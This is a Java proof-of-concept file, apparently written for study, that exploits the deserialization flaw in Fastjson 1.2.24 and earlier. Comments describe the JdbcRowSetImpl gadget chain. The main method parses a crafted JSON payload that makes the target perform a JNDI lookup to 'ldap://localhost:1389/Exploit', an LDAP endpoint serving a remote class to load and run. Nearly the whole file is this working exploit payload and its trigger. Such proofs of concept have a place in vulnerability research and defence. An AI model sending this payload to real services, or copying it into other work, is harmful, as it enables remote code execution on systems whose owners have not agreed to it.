package com.jemmy.serialize.leak;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

/**
 * FastJson version <= 1.2.24
 *
 * JdbcRowSetImpl利用链
 * JdbcRowSetImpl对象恢复->setDataSourceName方法调用
 * ->setAutocommit方法调用->context.lookup(datasourceName)调用
 *
 * @author zhujiang.cheng
 * @since 2020/6/3
 */
public class JdbcRowSetAttack {

    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}";
        JSONObject jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject);
    }
}
